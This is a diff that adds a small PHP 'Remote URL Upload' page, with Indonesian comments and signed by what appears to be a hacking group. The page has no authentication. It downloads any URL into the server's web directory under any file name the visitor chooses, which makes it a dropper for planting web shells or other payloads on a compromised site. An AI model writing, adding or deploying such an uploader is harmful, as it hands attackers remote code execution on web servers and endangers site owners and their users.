@@ -1,0 +1,16 @@
+<?php
+if($_POST['act'] == 'Import' &&$_POST['url'] != '')
+{$url=$_POST['url']; $nama=$_POST['nama'];
+//Jika nama file tidak diisi, maka nama filenya akan sama dengan nama file yang kita import.
+if($nama == '')
+{$file=basename($url);}
+//Kalo kita masukkan nama filenya, maka nama filenya akan berubah sesuai dengan nama yg kita masukkan.
+else{$file=$nama;}
+//File berhasil di import.
+if(copy($url,$file))
+{echo '<center><font color="green">File berhasil di import dan disimpan sebagai</font> '.$file;}
+//File gagal di import.
+else {echo '<center><font color="red">Gagal mengimport file</font> <a href='.basename($url).'>'.basename($url).'</a>';} echo '<hr />';}
+echo '<title>Remote URL Upload</title><body bgcolor=silver><center><form method="post">DDL (Direct Download Link)<br /><input type="text"name="url"><br />File Name (e.g : name.typ)<br /><input type="text"name="nama"><br /><input type="submit" name="act" value="Import" style="background:rgba(0,0,0, 0.0);color: #000"></form></center>';
+/*AZZATSSINS CYBERSERKERS*/
+?>
